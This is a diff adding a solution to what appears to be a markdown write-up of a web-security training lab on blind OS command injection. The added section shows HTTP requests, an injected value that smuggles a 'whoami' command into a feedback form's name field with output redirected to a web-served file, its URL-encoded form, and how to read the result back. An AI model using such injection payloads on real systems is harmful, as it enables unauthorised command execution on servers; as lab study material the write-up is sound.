@@ -34,4 +34,66 @@ To solve the lab, execute the whoami command and retrieve the output.
 
 **4. Check if file was created**
 
- 
+<br>
+
+## Solution:
+### The vulnerable parameter is the name field in the feedback form
+at this endpoint: `POST /feedback/submit`
+
+```HTTP
+POST /feedback/submit HTTP/2
+Host: 0a2f007903dd2e578305105c006200aa.web-security-academy.net
+Origin: https://0a2f007903dd2e578305105c006200aa.web-security-academy.net
+
+Referer: https://0a2f007903dd2e578305105c006200aa.web-security-
+
+csrf=sAk5Gg9Qxxvly8VWUAGGuxQyQeYQvzyq&name=Hackerman&email=peter%40normal-user.net&subject=foo&message=bar
+```
+
+`&name=Hackerman&`
+
+#### use the same command structure as in the previous lesson
+and preceed it with a random letter so that it wont pickup the command, makes it easier
+to execute, etc....
+
+```shell
+||ping+-c+10+127.0.0.1||
+```
+
+But here in this lab it's gonna be:
+```shell
+x||whoami > /var/www/images/whodatbe.txt||&
+```
+
+Then URL encode it, I used the Decoder tab:
+```URL
+%78%7c%7c%77%68%6f%61%6d%69%20%3e%20%2f%76%61%72%2f%77%77%77%2f%69%6d%61%67%65%73%2f%77%68%6f%64%61%74%62%65%2e%74%78%74%7c%7c
+```
+
+Then the end point containing the .txt file you made is located at:
+```HTTP
+GET /image?filename=21.jpg
+```
+
+It can be any jpg number, that's irrelevant, cause you're gonna change the .jpg file name
+to the name of the file you created that contains the output of `whoami` , and that will look like
+```HTTP
+GET /image?filename=whodatbe.txt HTTP/2
+Host: 0a2f007903dd2e578305105c006200aa.web-security-academy.net
+```
+
+and the response should be
+```HTTP
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+Set-Cookie: session=CsuBhNTngZrmPSJAreEo9oFnWjh80WCd; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 13
+
+peter-WKMu36
+```
+
+**And BOOM !**
+you are `peter-WKMu36`
+
+--Done--
